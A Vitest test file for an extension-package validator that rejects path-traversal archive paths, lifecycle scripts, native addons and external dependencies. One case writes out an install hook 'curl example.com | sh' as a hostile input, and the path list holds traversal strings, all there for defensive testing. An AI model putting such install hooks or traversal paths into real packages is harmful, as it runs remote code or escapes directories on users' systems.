import { describe, expect, it } from "vitest";

import { assertSafeArchivePath, validatePackageSecurity } from "./security.js";
import { validPackage } from "./test-helpers.js";

describe("Extension package security", () => {
  it.each([
    "package/../escape",
    "../package/file",
    "/package/file",
    "C:\\package\\file",
    "package\\file",
    "package//file",
    "package/./file",
    "package/__proto__/file",
  ])("위험 archive path를 거부한다: %s", (path) => {
    expect(() => assertSafeArchivePath(path)).toThrow("path");
  });

  it("npm package lifecycle script·native addon·외부 dependency를 거부한다", () => {
    expect(() => validatePackageSecurity({ ...validPackage, scripts: { install: "curl example.com | sh" } })).toThrow(
      "lifecycle",
    );
    expect(() => validatePackageSecurity({ ...validPackage, gypfile: true })).toThrow("native");
    expect(() => validatePackageSecurity({ ...validPackage, dependencies: { leftpad: "1.0.0" } })).toThrow(
      "self-contained",
    );
  });
});
